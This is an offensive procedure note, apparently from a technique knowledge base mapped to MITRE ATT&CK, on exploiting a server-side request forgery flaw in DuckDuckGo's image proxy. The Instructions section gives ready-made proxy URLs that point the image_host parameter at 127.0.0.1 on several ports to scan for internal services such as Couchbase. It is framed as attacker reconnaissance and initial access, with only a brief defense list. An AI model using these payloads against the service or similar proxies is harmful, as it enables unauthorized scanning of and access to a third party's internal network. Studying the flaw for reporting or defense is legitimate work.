---
tags:
  - ssrf
  - internal-scan
  - localhost
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.528Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 3be508f2-a0d8-458a-89f5-8e72d02417dd
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-SSRF-with-Internal-Localhost-URLs

## Summary

This procedure exploits the SSRF vulnerability in the DuckDuckGo proxy's image_host parameter by supplying internal localhost URLs, enabling scanning for open ports and services on the internal network.

## Description

The image_host GET parameter lacks validation beyond requiring http:// or https:// prefixes, allowing requests to 127.0.0.1 on arbitrary ports. By testing ports like 18091, 9998, 8092, and 8091, attackers can probe for internal services such as Couchbase, observing response differences (e.g., delays or errors) to map the network. This bypasses external firewalls, providing reconnaissance on non-exposed applications. Prerequisites include browser access; outcomes include identification of vulnerable internal endpoints.

## Requirements

1. Web browser for URL manipulation
2. Knowledge of common internal ports (e.g., Couchbase defaults)
3. Public access to the proxy endpoint

## Defense

Defensive measures and detection strategies:

- Validate and whitelist image_host domains, blocking localhost and private IPs
- Deploy network segmentation to isolate internal services
- Log and alert on proxy requests to internal addresses

## Objectives

1. Trigger SSRF to request internal localhost resources
2. Identify open ports and responsive services
3. Confirm access to restricted internal web applications

## Instructions

### Step 1: Craft Internal URL Tests

**Context**: Replace the image_host with localhost variants to initiate SSRF requests.

Use browser to visit:

```url
https://proxy.duckduckgo.com/iur/?f=1&image_host=https://127.0.0.1:18091/
```

> This sends a request to the internal port 18091 via the proxy. Expect potential connection attempts or errors indicating service presence.

### Step 2: Iterate Over Ports

**Context**: Test multiple ports to scan the internal network.

Visit additional URLs:

```url
https://proxy.duckduckgo.com/iur/?f=1&image_host=http://127.0.0.1:9998/
```

```url
https://proxy.duckduckgo.com/iur/?f=1&image_host=http://127.0.0.1:8092/
```

```url
https://proxy.duckduckgo.com/iur/?f=1&image_host=http://127.0.0.1:8091/
```

> Monitor for unique responses per port, such as successful fetches for open services like Couchbase on 8091/8092.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- port-scan
- internal-access
